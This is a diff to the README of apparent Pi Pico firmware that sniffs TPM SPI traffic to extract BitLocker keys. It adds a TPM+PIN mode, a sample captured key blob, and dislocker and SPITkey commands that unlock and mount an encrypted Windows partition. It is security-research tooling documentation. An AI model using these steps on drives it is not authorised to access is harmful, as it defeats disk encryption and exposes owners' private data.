@@ -12,6 +12,12 @@ Higher frequencies may be supported through overclocking.
 
 [Watch the video!](https://www.youtube.com/watch?v=U-wuOeI9vQg)
 
+Two protection modes are supported:
+ + TPM only, where the PC can boot without user intervention
+ + TPM + PIN, where bitlocker asks for a PIN code on boot. In this mode the PIN must be known in order to sniff the TPM blob
+
+See Build section for instruction on how to choose between the two modes.
+
 ## Compatibility
 
 The following devices have been tested.
@@ -92,6 +98,8 @@ cmake ..
 make
 ```
 
+The firmware works in either TPM or TPM+PIN mode; by default the build produces a TPM only firmware. To build a TPM+PIN firmware, change line 13 in  `main.c` from `#undef TPM_AND_PIN` to `#define TPM_AND_PIN`
+
 > [!NOTE]
 > Built on Debian 12.
 
@@ -125,9 +133,11 @@ Connect to the Pi Pico with your serial terminal of choice and boot the target s
 picocom -q /dev/ttyACM0 -b 115200
 ```
 
+### with TPM only
 You should see output similar to this.
 
 > Capturing SPI traffic into 12 16384-byte buffers.  
+> Expecting TPM only protection. VMK will be output if found.
 > Press any key to finalize the capture and reboot.  
 > VMK: DEADC0DEDEADC0DEDEADC0DEDEADC0DEDEADC0DEDEADC0DEDEADC0DEDEADC0DE  
 
@@ -146,6 +156,30 @@ mount -t ntfs-3g -o remove_hiberfile,recover /mnt/dislocker/dislocker-file /mnt/
 ls /mnt/drive_c/
 ```
 
+### with TPM+PIN
+a PKEY will be output after entering the PIN to the target computer:
+
+> Capturing SPI traffic into 12 16384-byte buffers.  
+> Expecting TPM and PIN protection. Pkey will be output if found.  
+> Press any key to finalize the capture and reboot.  
+> PKEY: 80216F353D57DD01540000006F3E05FA067913FCB8714AC58FCD94E3E25E4D2E20F906C8CF40F1B9F59199B538A953E168A71D3D7B5C07331DF4B931FC3043565B90DC98E9F7225C  
+
+You will need [SPITkey](https://github.com/en4rab/SPITkey) and the output of a first dislocker run to obtain the FVEK:
+
+```
+dislocker -vvvv /dev/sda3 >dislocker.log
+echo 80216F353D57DD01540000006F3E05FA067913FCB8714AC58FCD94E3E25E4D2E20F906C8CF40F1B9F59199B538A953E168A71D3D7B5C07331DF4B931FC3043565B90DC98E9F7225C >tpm-blob
+python SPITKEY.py -l dislocker.log -p <bitlocker PIN> -t tpm-blob
+```
+
+SPITKEY will produce a file named `<machinename>.fvek`, use it with dislocker:
+
+```
+dislocker -V /dev/sda3 -k <machinename>.fvek /mnt/dislocker
+mount -t ntfs-3g -o remove_hiberfile,recover /mnt/dislocker/dislocker-file /mnt/drive_c
+ls /mnt/drive_c/
+```
+
 ## Related Projects
 * https://github.com/decrazyo/spi-analyzer
 * https://github.com/ReversecLabs/bitlocker-spi-toolkit
@@ -154,3 +188,4 @@ ls /mnt/drive_c/
 * https://github.com/zaphoxx/pico-tpmsniffer-spi
 * https://github.com/aplhk/pico-spisniffer
 * https://github.com/jerji/picobitlkr
+* https://github.com/en4rab/SPITkey
